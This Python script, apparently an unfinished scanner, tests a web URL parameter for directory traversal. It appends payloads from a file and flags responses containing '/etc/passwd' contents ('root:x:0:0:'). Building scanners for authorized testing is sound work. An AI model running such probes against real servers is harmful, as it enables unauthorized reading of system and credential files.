import sys
import requests
from bs4 import BeautifulSoup

def run(link, soup):
  print("Running {}\n".format(link))

  payloads = get_payload_list()

  # TODO add checks
  # if link is a get request
  send_get_request(link, None, payloads)

  # else if link is post request
  # send_post_request(link, None, payloads)

def get_payload_list(filename='directory_traversal_payloads.txt'):
  """Returns payloads in payload file as a list"""
  with open(filename) as f:
    payloads = f.read().splitlines()
    return payloads

def send_get_request(link, soup, payloads):
  """Try payloads in a get request"""
  for payload in payloads:
    # TODO for the time being, assumes that:
    # 1. there is only one param
    # 2. link given to it includes the param name
    # e.g. http://target.com/directorytraversal/directorytraversal.php?ascii=

    full_link = link + payload
    print("Trying get request {}".format(full_link))
    response = requests.get(full_link)
    print("Exploitable with payload {}: {}\n".format(payload, contains_passwd(response)))

def send_post_request(link, soup, payloads):
  """Try payloads in a post request"""
  for payload in payloads:
    # TODO change post request
    # 1. params and link?
    # 2. headers?
    # 3. need to send data as JSON?

    print("Trying post request {}".format(link))
    response = requests.post(link, data = {'key':payload})
    print(response.text)
    print("Exploitable with payload {}: {}\n".format(payload, contains_passwd(response)))

def contains_passwd(response):
  """Checks if reponse constains /etc/passwd contents
  Works by checking if the response contains 'root:x:0:0:'

  Args:
    response: Requests response object

  Returns:
    boolean
  """
  # TODO: need to find out if this is the best way to check /etc/passwd got displayed\
  #       maybe just change to ':x:0:0' because the username of root user may not always be root
  #       but the uid and gid is guaranteed to be 0

  ROOT_LINE = 'root:x:0:0:'

  if response.status_code != 200:
    return False

  if ROOT_LINE in response.text:
    return True

  # TODO: in case response contains JSON use reponses.json()
  # TODO: check if necessary - maybe using .text is sufficient
  # tested with nusmods api - probably no need to use reponses.json()

  return False

# TODO for testing, remove when done
if __name__ == '__main__':

  if len(sys.argv) != 2:
    print("input link pls")
  else:
    run(sys.argv[1], None)
